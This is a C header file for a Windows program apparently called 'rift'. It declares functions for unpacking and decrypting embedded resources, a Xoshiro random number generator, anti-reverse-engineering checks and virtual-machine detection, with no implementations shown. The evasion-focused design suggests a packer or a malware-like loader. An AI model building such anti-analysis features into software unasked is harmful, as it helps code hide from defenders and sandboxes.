#pragma once
/* Compiler / Headers */
#pragma comment(linker, "\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma warning(disable : 4214)
#include "_rift_shared.h"
#include "resource.h"

/* WinMain : main.c */
WCHAR g_szMFN[MAX_PATH];
WCHAR g_szCD[MAX_PATH];
HMODULE g_hmMH;

/* Unpack Resource / Copressor and Crypto / UnpackRes.c */
BOOL fnUnpackResource(
	_In_ PCWSTR szInFN,
	_In_ PCWSTR szOutFN,
	_In_ WORD   wResID
);

/* Xoshiro PRNG Algorithm : Xoshiro.c */
UINT32 fnNext128ss(_Inout_ PVOID pui32S);
UINT32 fnNext128p(_Inout_ PVOID pui32S);
#if _DISABLE_JUMPS == 0
VOID fnLJump128(_Inout_ PVOID pui32S);
VOID fnSJump128(_Inout_ PVOID pui32S);
#endif
UINT32 fnURID32(_In_ UINT32 ui32Max, _In_ UINT32 ui32Min, _Inout_ PVOID pui32S);
float fnURRD24(_Inout_ PVOID pui32S);
PVOID fnAllocXSR(_In_ PXSR sParamA);
BOOL fnRelocXSR(_Inout_ PVOID pS, _In_ PXSR sParamA);
PVOID fnCopyXSR(_In_ PVOID pui32S);
VOID fnDelocXSR(_Inout_ PVOID pui32S);

/* ResourceManager : Resource.c */
BOOL fnExtractResourceW(_In_ WORD wResID, _In_ PCWSTR lpResType, _In_ PCWSTR lpFileName);
PVOID fnLoadResourceW(_In_ WORD wResID, _In_ PCWSTR lpResType, _Out_ PDWORD dwBufferSize);

/* Anti-ReverseEngineering : AntiRE.c */
BOOL fnAntiRE();

/* VMDetection : VMDetect.c */
BOOL fnCheckVMPresent();

/* Crypto Tools : BCrypt.c */

/* ConsoleHost : Console.c */
BOOL fnAllocConsole();
extern const WCHAR szConsoleTitle[];
extern const UINT8 nConsoleTitleLen;